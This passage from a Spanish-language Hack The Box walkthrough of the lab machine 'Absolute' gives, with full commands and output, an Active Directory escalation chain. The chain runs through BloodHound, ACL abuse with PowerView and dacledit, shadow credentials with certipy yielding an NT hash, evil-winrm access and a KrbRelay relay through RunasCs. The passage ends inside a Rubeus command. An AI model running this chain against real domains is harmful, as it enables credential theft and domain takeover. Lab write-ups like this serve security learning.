+<p class="plain-text">Para recolectar un poco de información del dominio podemos usar <code class="language-plaintext highlighter-rouge">bloodhound</code> con cualquiera de las credenciales de m.lovegod, al terminar nos crea un <code class="language-plaintext highlighter-rouge">zip</code> con ella</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ bloodhound-python</span><span class="p"> -u m.lovegod -p AbsoluteLDAP2022! -k -c All -d absolute.htb -dc dc.absolute.htb -ns 10.10.11.181 --zip  
+INFO: Found AD domain: absolute.htb
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: dc.absolute.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: dc.absolute.htb
+INFO: Found 18 users
+INFO: Found 55 groups
+INFO: Found 2 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: dc.absolute.htb
+INFO: Done in 00M 29S
+INFO: Compressing output into 20230518210834_bloodhound.zip</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Subimos el zip a <code class="language-plaintext highlighter-rouge">bloodhound</code>, usando m.lovegod encontramos una ruta para convertirnos en winrm_user, el usuario <code class="language-plaintext highlighter-rouge">m.lovegod</code> tiene privilegio <code class="language-plaintext highlighter-rouge">owns</code> sobre el grupi <code class="language-plaintext highlighter-rouge">Network Audit</code> que a su vez tiene <code class="language-plaintext highlighter-rouge">GenericWrite</code> sobre <code class="language-plaintext highlighter-rouge">winrm_user</code></p>
+<a href="/htb/absolute/5.png" target="_blank"><div><p><img src="/htb/absolute/5.png"></p></div></a>
+
+<p class="plain-text">Hay diferentes formas de hacerlo, iniciemos con <code class="language-plaintext highlighter-rouge">powershell</code> importando el modulo <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1s">PowerView.ps1</a> y <code class="language-plaintext highlighter-rouge">ActiveDirectory</code>, ademas definimos la credencial de <code class="language-plaintext highlighter-rouge">m.lovegod</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\pc1\Desktop> </span><span class="am">Import-Module</span><span class="p"> .\PowerView.ps1
+PS C:\Users\pc1\Desktop> </span><span class="am">Import-Module </span><span class="p">ActiveDirectory
+PS C:\Users\pc1\Desktop> </span><span class="ve">$SecPassword </span><span class="c1">= </span><span class="am">ConvertTo-SecureString </span><span class="az">"AbsoluteLDAP2022!" </span><span class="c1">-AsPlainText -Force</span><span class="p">
+PS C:\Users\pc1\Desktop> </span><span class="ve">$Cred </span><span class="c1">= </span><span class="am">New-Object </span><span class="p">System.Management.Automation.PSCredential(</span><span class="az">"absolute.htb\m.lovegod"</span><span class="p">, </span><span class="ve">$SecPassword</span><span class="p">)  
+PS C:\Users\pc1\Desktop></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora le damos privilegios <code class="language-plaintext highlighter-rouge">All</code> a m.lovegod sobre <code class="language-plaintext highlighter-rouge">Network Audit</code> modificando el ACL, despues agregamos al usuario <code class="language-plaintext highlighter-rouge">m.lovegod</code> al grupo ya que no es parte de el</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\pc1\Desktop> </span><span class="am">Add-DomainObjectAcl </span><span class="c1">-Credential </span><span class="ve">$Cred </span><span class="c1">-TargetIdentity </span><span class="am">"Network Audit" </span><span class="c1">-Rights </span><span class="p">All </span><span class="c1">-PrincipalIdentity </span><span class="az">"m.lovegod" </span><span class="c1">-DomainController </span><span class="p">dc.absolute.htb  
+PS C:\Users\pc1\Desktop> </span><span class="am">Add-ADPrincipalGroupMembership </span><span class="c1">-Identity </span><span class="az">"m.lovegod" </span><span class="c1">-MemberOf </span><span class="az">"Network Audit" </span><span class="c1">-Credential </span><span class="ve">$Cred </span><span class="c1">-Server </span><span class="p">dc.absolute.htb
+PS C:\Users\pc1\Desktop></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Esto tambien se puede hacer desde <code class="language-plaintext highlighter-rouge">Linux</code>, usamos <code class="language-plaintext highlighter-rouge">dacledit</code> para otorgar <code class="language-plaintext highlighter-rouge">FullControl</code> al usuario <code class="language-plaintext highlighter-rouge">m.lovegod</code> sobre el grupo y con <code class="language-plaintext highlighter-rouge">net rpc</code> lo agregamos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-dacledit </span><span class="p">absolute.htb/m.lovegod:AbsoluteLDAP2022! -k -dc-ip dc.absolute.htb -principal m.lovegod -target </span><span class="am">"Network Audit"</span><span class="p"> -action write -rights FullControl  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] DACL backed up to dacledit-20230618-024455.bak
+[*] DACL modified successfully!
+
+</span><span class="ve">❯ net </span><span class="p">rpc group addmem </span><span class="am">"Network Audit" </span><span class="p">m.lovegod -U </span><span class="am">'absolute.htb/m.lovegod%AbsoluteLDAP2022!'</span><span class="p"> -S dc.absolute.htb --use-kerberos=required</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos comprobar que ahora el usuario <code class="language-plaintext highlighter-rouge">m.lovegod</code> forma parte de este grupo con <code class="language-plaintext highlighter-rouge">net rpc</code> listando los miembros que forman parte del grupo <code class="language-plaintext highlighter-rouge">Network Audit</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ net </span><span class="p">rpc group members </span><span class="am">"Network Audit" </span><span class="p">-U </span><span class="am">'absolute.htb/m.lovegod%AbsoluteLDAP2022!'</span><span class="p"> -S dc.absolute.htb --use-kerberos=required  
+absolute\m.lovegod
+absolute\svc_audit</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para autenticarnos mas adelante usaremos <code class="language-plaintext highlighter-rouge">kerberos</code>, asi que para guardar la información de los <code class="language-plaintext highlighter-rouge">grupos</code> actuales generaremos un <code class="language-plaintext highlighter-rouge">TGT</code> y lo exportamos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-getTGT </span><span class="p">absolute.htb/m.lovegod:AbsoluteLDAP2022!  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Saving ticket in m.lovegod.ccache
+
+</span><span class="ve">❯ export </span><span class="p">KRB5CCNAME=m.lovegod.ccache</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para explotar el privilegio hacia <code class="language-plaintext highlighter-rouge">winrm_user</code> hay diferentes formas de hacerlo, usaremos <code class="language-plaintext highlighter-rouge">certipy</code> ya que hace todos lo que necesitamos pasos en un solo comando, al terminar crea un <code class="language-plaintext highlighter-rouge">TGT</code> como winrm_user y nos muestra su <code class="language-plaintext highlighter-rouge">hash NT</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ certipy </span><span class="p">shadow auto -u absolute.htb/m.lovegod@dc.absolute.htb -k -no-pass -target dc.absolute.htb -account winrm_user
+Certipy v4.4.0 - by Oliver Lyak (ly4k)
+
+[*] Targeting user 'winrm_user'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '6d546f8b-50fb-1909-a2e7-1ffb4b3ecc4c'
+[*] Adding Key Credential with device ID '6d546f8b-50fb-1909-a2e7-1ffb4b3ecc4c' to the Key Credentials for 'winrm_user'
+[*] Successfully added Key Credential with device ID '6d546f8b-50fb-1909-a2e7-1ffb4b3ecc4c' to the Key Credentials for 'winrm_user'  
+[*] Authenticating as 'winrm_user' with the certificate
+[*] Using principal: winrm_user@absolute.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'winrm_user.ccache'
+[*] Trying to retrieve NT hash for 'winrm_user'
+[*] Restoring the old Key Credentials for 'winrm_user'
+[*] Successfully restored the old Key Credentials for 'winrm_user'
+[*] NT hash for 'winrm_user': 8738c7413a5da3bc1d083efc0ab06cb2</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si nos intentamos autenticar usando el hash NT de <code class="language-plaintext highlighter-rouge">winrm_user</code> nos devuelve un error</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ evil-winrm</span><span class="p"> -i absolute.htb -u winrm_user -H 8738c7413a5da3bc1d083efc0ab06cb2
+</span><span class="ro">
+Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError  
+
+Error: Exiting with code 1</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El error es debido a las restricciones del grupo <code class="language-plaintext highlighter-rouge">Protected Users</code> al que hemos visto que pertenecen los usuarios y del cual el usuario <code class="language-plaintext highlighter-rouge">winrm_user</code> tambien forma parte</p>
+<a href="/htb/absolute/6.png" target="_blank"><div><p><img src="/htb/absolute/6.png"></p></div></a>
+
+<p class="plain-text"><code class="language-plaintext highlighter-rouge">Certipy</code> tambien nos ha generado un <code class="language-plaintext highlighter-rouge">TGT</code> como el usuario <code class="language-plaintext highlighter-rouge">winrm_user</code> podemos exportar la variable <code class="language-plaintext highlighter-rouge">KRB5CCNAME</code> y comprobarlo con <code class="language-plaintext highlighter-rouge">crackmapexec</code>, es valido</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ export </span><span class="p">KRB5CCNAME=winrm_user.ccache
+
+</span><span class="ve">❯ crackmapexec </span><span class="p">smb absolute.htb -k --use-kcache 
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="ve">[+] </span><span class="p">absolute.htb\ from ccache</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos utilizar ese <code class="language-plaintext highlighter-rouge">ticket</code> para autenticarnos pero antes necesitamos configurar un <code class="language-plaintext highlighter-rouge">realm</code> para <code class="language-plaintext highlighter-rouge">ABSOLUTE.HTB</code> con sus parametros en el <code class="language-plaintext highlighter-rouge">/etc/krb5.conf</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">[realms]
+	ABSOLUTE.HTB = {
+		kdc = dc.absolute.htb
+		admin_server = dc.absolute.htb  
+		default_domain = absolute.htb
+	}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora podemos conectarnos indicando simplemente el <code class="language-plaintext highlighter-rouge">realm</code> configurado y usando el ticket de <code class="language-plaintext highlighter-rouge">winrm_user</code> como autenticacion, podemos leer la primera <code class="language-plaintext highlighter-rouge">flag</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ evil-winrm </span><span class="p">-i dc.absolute.htb -r absolute.htb
+PS C:\Users\winrm_user\Documents> </span><span class="am">whoami</span><span class="p">
+absolute\winrm_user
+PS C:\Users\winrm_user\Documents> </span><span class="am">type</span><span class="p"> ..\Desktop\user.txt  
+d52**************************81c
+PS C:\Users\winrm_user\Documents></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="shell-administrator">
+<br><h3 class="post-title">Shell - Administrator</h3><br>
+
+<p class="plain-text">Dentro de las explotaciones que podriamos probar <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">winpeas</a> nos recomenda KrbRelay</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="az">ÉÍÍÍÍÍÍÍÍÍÍ¹ </span><span class="ve">Checking KrbRelayUp
+</span><span class="az">È  </span><span class="am">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#krbrelayup  
+  </span><span class="ro">The system is inside a domain (absolute) so it could be vulnerable.
+</span><span class="az">È </span><span class="ve">You can try https://github.com/Dec0ne/KrbRelayUp to escalate privileges</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En este caso explotaremos un <code class="language-plaintext highlighter-rouge">KrbRelay</code>, para hacerlo antes necesitaremos <a href="https://github.com/cube0x0/KrbRelay">KrbRelay.exe</a> y <a href="https://github.com/GhostPack/Rubeus">Rubeus.exe</a>, que se pueden compilar con <code class="language-plaintext highlighter-rouge">Visual Studio</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\winrm_user\Documents> </span><span class="am">upload </span><span class="p">KrbRelay.exe
+</span><span class="az">
+Info: Uploading KrbRelay.exe
+</span><span class="sa">
+Data: 2157224 bytes of 2157224 bytes copied
+</span><span class="az">
+Info: Upload successful!
+</span><span class="p">
+PS C:\Users\winrm_user\Documents> </span><span class="am">upload </span><span class="p">Rubeus.exe
+</span><span class="az">
+Info: Uploading /home/kali/Downloads/pywhisker/Rubeus.exe to C:\Users\winrm_user\Documents\Rubeus.exe  
+</span><span class="sa">
+Data: 595968 bytes of 595968 bytes copied
+</span><span class="az">
+Info: Upload successful!
+</span><span class="p">
+PS C:\Users\winrm_user\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ejecutamos KrbRelay bajo el spn <code class="language-plaintext highlighter-rouge">ldap/dc.absolute.htb</code> y el <a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/Windows_10_Pro/README.md">clsid</a> que corresponde a <code class="language-plaintext highlighter-rouge">TrustedInstaller</code>, usamos el parametro <code class="language-plaintext highlighter-rouge">-shadowcred</code> para ver las credenciales</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\winrm_user\Documents> </span><span class="am">.\KrbRelay.exe </span><span class="c1">-spn </span><span class="p">ldap/dc.absolute.htb </span><span class="c1">-clsid</span><span class="az"> "{752073A1-23F2-4396-85F0-8FDB879ED0ED}" </span><span class="c1">-shadowcred</span><span class="p">
+[*] Relaying context: absolute.htb\DC$
+[*] Rewriting function table
+[*] Rewriting PEB
+[*] GetModuleFileName: System
+[*] Init com server
+[*] GetModuleFileName: C:\Users\winrm_user\Documents\KrbRelay.exe
+[*] Register com server
+objref:TUVPVwEAAAAAAAAAAAAAAMAAAAAAAABGgQIAAAAAAAB9UO6T5jDvBi7CLBw/+3tpAhAAAGQL//9OJDLtQKTCwCIADAAHADEAMgA3AC4AMAAuADAALgAxAAAAAAAJAP//AAAeAP//AAAQAP//AAAKAP//AAAWAP//AAAfAP//AAAOAP//AAAAAA==:  
+
+[*] Forcing SYSTEM authentication
+[*] Using CLSID: 752073a1-23f2-4396-85f0-8fdb879ed0ed
+System.UnauthorizedAccessException: Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED))
+   at KrbRelay.Ole32.CoGetInstanceFromIStorage(COSERVERINFO pServerInfo, Guid& pclsid, Object pUnkOuter, CLSCTX dwClsCtx, IStorage pstg, UInt32 cmq, MULTI_QI[] rgmqResults)
+   at KrbRelay.Program.Main(String[] args)
+PS C:\Users\winrm_user\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nos devuelve un error, esto es debido a que no estamos bajo una <code class="language-plaintext highlighter-rouge">sesión</code> interactiva en la cual se almacenan las <code class="language-plaintext highlighter-rouge">credenciales</code> en memoria a diferencia de este contexto</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\winrm_user\Documents> </span><span class="am">qwinsta </span><span class="p">
+qwinsta.exe : No session exists for *
+    + CategoryInfo          : NotSpecified: (No session exists for *:String) [], RemoteException  
+    + FullyQualifiedErrorId : NativeCommandError
+PS C:\Users\winrm_user\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para solucionar este error podemos hacer uso de <a href="https://github.com/antonioCoco/RunasCs">RunasCs</a> e iniciar una sesión como otro usuario, para ello primero subimos el archivo <code class="language-plaintext highlighter-rouge">ps1</code> y lo importamos en powershell</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\winrm_user\Documents> </span><span class="am">upload </span><span class="p">Invoke-RunasCs.ps1
+ </span><span class="az">
+Info: Uploading Invoke-RunasCs.ps1 to C:\Users\winrm_user\Documents\Invoke-RunasCs.ps1  
+ </span><span class="sa">
+Data: 117056 bytes of 117056 bytes copied
+ </span><span class="az">
+Info: Upload successful!
+ </span><span class="p">
+PS C:\Users\winrm_user\Documents> </span><span class="am">Import-Module </span><span class="p">.\Invoke-RunasCs.ps1
+PS C:\Users\winrm_user\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al intentar ejecutar comandos como <code class="language-plaintext highlighter-rouge">m.lovegod</code> nos devuelve <code class="language-plaintext highlighter-rouge">Wrong Credentials</code>, esto es por la <code class="language-plaintext highlighter-rouge">limitacion</code> que sabemos que tiene y el tipo de autenticacion</a>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\winrm_user\Documents> </span><span class="am">Invoke-RunasCs </span><span class="p">m.lovegod AbsoluteLDAP2022! qwinsta  
+[-] RunasCsException: Wrong Credentials. LogonUser failed with error code: 1327
+PS C:\Users\winrm_user\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al usar el tipo de inicio de sesión <code class="language-plaintext highlighter-rouge">9</code> es como si usaramos el parametro <code class="language-plaintext highlighter-rouge">/netonly</code> en <code class="language-plaintext highlighter-rouge">runas.exe</code>, no cambiamos de usuario pero ya estamos dentro de una <code class="language-plaintext highlighter-rouge">sesion</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\winrm_user\Documents> </span><span class="am">Invoke-RunasCs </span><span class="p">m.lovegod AbsoluteLDAP2022! -l 9 qwinsta  
+ SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
+>services                                    0  Disc
+ console                                     1  Conn
+PS C:\Users\winrm_user\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ejecutamos nuevemente <code class="language-plaintext highlighter-rouge">KrbRelay</code> nuevamente pero bajo el contexto de la sesión con <code class="language-plaintext highlighter-rouge">RunasCs</code> y parece que sale bien ya que nos genera el <code class="language-plaintext highlighter-rouge">certificado</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\winrm_user\Documents> </span><span class="am">Invoke-RunasCs </span><span class="p">m.lovegod AbsoluteLDAP2022! -l 9 </span><span class="az">"C:\Users\winrm_user\Documents\KrbRelay.exe -spn ldap/dc.absolute.htb -clsid {752073A1-23F2-4396-85F0-8FDB879ED0ED} -shadowcred" </span><span class="p">
+[*] Relaying context: absolute.htb\DC$
+[*] Rewriting function table
+[*] Rewriting PEB
+[*] GetModuleFileName: System
+[*] Init com server
+[*] GetModuleFileName: C:\Users\winrm_user\Documents\KrbRelay.exe
+[*] Register com server
+objref:TUVPVwEAAAAAAAAAAAAAAMAAAAAAAABGgQIAAAAAAABFBQ5ARqqf5Y8ERBYoG+8+AkwAADQP///1HMm7Gy7H4SIADAAHADEAMgA3AC4AMAAuADAALgAxAAAAAAAJAP//AAAeAP//AAAQAP//AAAKAP//AAAWAP//AAAfAP//AAAOAP//AAAAAA==:
+
+[*] Forcing SYSTEM authentication
+[*] Using CLSID: 752073a1-23f2-4396-85f0-8fdb879ed0ed
+[*] apReq: 608206b406092a864886f71201020201006e8206a33082069fa003020105a10302010ea20703050020000000a38204e1618204dd308204d9a003020105a10e1b0c4142534f4c5554452e485442a2223020a003020102a11930171b046c6461701b0f64632e6162736f6c7574652e687462a382049c30820498a003020112a103020104a282048a048204862648e3190e328d8fa977c58214422bd49944f9f87dfa8b3b372378e91c4e2332ceb9718bb93c7f5f6c2c7a9edf90b6a9d39e1e266ebc3e27bbe2e31a8cdad4f6cd540aae7bcbd54f489639b3115c35b661cafcaca6591eb3fd14d688644f5c2bde28af164a74b1fe02b839a81fc58dae54ee0b4bb064aa58c3424a4f604e7eb6d4ca61171aecd187914c7795152550167e063ad00726f136a4a667f5085a585882755f44aac8c281a1b71862ec57b7b3c93fe8b612d9700d2c693549cfe77ebf3bebbd0b4517d8e881a013036143274e44ad859f7e6faa6aba5dfcc38ea0dd85d169006b378cfcd5f26079d46e7fa316edbddbc533409084981ea1cf0a24d663d17613caa2334b428db7f85c4b8ed6988bf8a877fc31743dcc25ddf5e7335976e4010e35a036b0fb7f8333d96bbccb67ed09a692e361250bfdf77a85b656d180a172f0653f72cfdb87b1e0cee81f65f1822a1badaf15dc5800c238d1774c8064e5a8e889ce643ecf5085b479502a09c8b385096d999d2c6b84d2a3d0a25306095c2715032a96256871e766d3c2111c683b9be5a346d78db4330bfe17bcfafd9923f04bbc3494423b61ecaffc092e02e937c31905f3a0087a8920678b69205668556bdae08eda976a367b213bd82e506900c7ebf6377305927377f4c379e95772a99ff3af4727cf4a6d4b6354c718361309ce672b60f965a4c531cecc9ab362d0cbc7ce37fefd7d84bb83a169e10c0f527dd1a7b47341401befe4f6d6be1db66d71a1208a21bda40b51c13e35b258c6bb540d4304de9aab74c35bc34d62282def43d710e1d857ea18d6f5cca14858486fe7290166caf0afadd5a279f820181955a01f7bf9ab74171477c01e8b3f4a46c56c53d30e04ebbfc9dd39dbe3cb3d197e2d7c526c7ab1e0f47d65b82fdfd0bec5dc9fb434da0c17d5b1718fff1dc63c1c113586c296f9304041e8177f0a05df23cdd541dbd4ff76863db9f224c92140673128e0edb31246eab09dab780152bd6d63472cabdbad82cff749934f9f911625ae4f4b3f8e2876141e2b74dce652fd7ebdf951fecfb0767de21541834272e78cb5413049333fa4c3d24b515dc1cd34eec03caea71949a4bd033a669ca5793960ae4a6d0090320d8bc9b4aa05c97437e96242ae74d5281b6aa114deb585cd2ff777d83f892c7eecca4e0534528beef59bec48eb592ca41b972bd6b3ee3c341930fad4b9473da6805e1e55aebbc84cafdb62363af9d9c73d45a4432b834b84f3d529a4aea1d529a62c5efa6dcaa096f226bdf9f152d002db7a1b501ec3fc2f123f71f1bf6ddc35d1680fd8794d86b2a998de7a11ce7d95d921d3465a9dd0abe64ce463ac028ef1e378d33dc81c8cff8a4c1d83e9221656164fa303d371dbbad670eea3ef6193b1ab9f30b86dd0e46cafbbc7b053570824de5bb464dddd77d9d7b0cc9e73ba6ec2032affc23bc22b4de936bf005674862a5c2cfd50b02fb92a286401fc633d341bc48c4e6e88930066bebcd71570d290b29fb815fd7bf8818e15cc10bdc8649fe510ae546663f4829f55a5375d7d1829ba7a1fe50211f6126e99ec2aa8973e8f32b362791ecdf9cadad625d48fef821f8649fc615c5576b204f8dae1293914778aa48201a33082019fa003020112a282019604820192e44eab386001ccdf6d5eb569ecc203c68e0388d047226f6b730680b29c9cf274af6bc1446a78fc2367291d7b5d50f8c4672791869b81119f9b37bd8436bbc5541007823a41a4de1c3eab53085e8a678364294b46fbce80d01ff5051bcc8efa1fae3157f2e479c82e6dc52044bf34fbb06e28f890ad311f6eb91ae12bea0944fe5a1fae465cf0a5422ad0b7e1f1d1ed07f82c306379e9169d31a6bd597eaca0e2de27806cc4ee004b98a98ce940443d9b8a1601417b86edddf03dd91ea95156eccb66d5962a64b9729e06cf5628ee17734a65e7a501bed8f458f905047f2e1336a307e42006d4a8f44c29f3809484cbd8b2d274180f5bbff4cfafb96a2b36ac4def108d15402f4039da3486338b1c27aa225aef5fa91ae0649bf00ca74eccb9d4c43784acbf2725d5af491b539e639386e0a2c69175ca8965ff3aad67e66b45921b0db28e9ed2463c32dce05939e8314f9f6714a48855fa24c06a28923b35e4adbb4c46c7a9c219c2c8e2ac1258331f40a8054852b505a8112279871391a121c1f328462bfae4c31c109dac68103ee19fc6fd  
+[*] bind: 0
+[*] ldap_get_option: LDAP_SASL_BIND_IN_PROGRESS
+[*] apRep1: 6f8188308185a003020105a10302010fa2793077a003020112a270046ebbafb0b5147c47521444c554b0cf23f5df8e65425c14ac2ab782363b88cfcc1b440afc1cf9623810823f4c79f5ed71968430af78002d9266a63a7a4fd66fdc7971b7e593fd3824c48950d952300565cd6cbc7ec1b03ac1a5fa37aec0287b3d283d404306e58687af5265f37a4c46
+[*] AcceptSecurityContext: SEC_I_CONTINUE_NEEDED
+[*] fContextReq: Delegate, MutualAuth, UseDceStyle, Connection
+[*] apRep2: 6f5b3059a003020105a10302010fa24d304ba003020112a24404420145415d3c01b24d07221110819665c47fd4f07108c1f8485e3f4a55d319dd38d3aa5ac864bfc80283d49c4c83f69cd5b23450a6d495f86b6b7ef0084d1cf3b8cc90
+[*] bind: 0
+[*] ldap_get_option: LDAP_SUCCESS
+[+] LDAP session established
+[*] ldap_modify: LDAP_SUCCESS
+Rubeus.exe asktgt /user:DC$ /certificate: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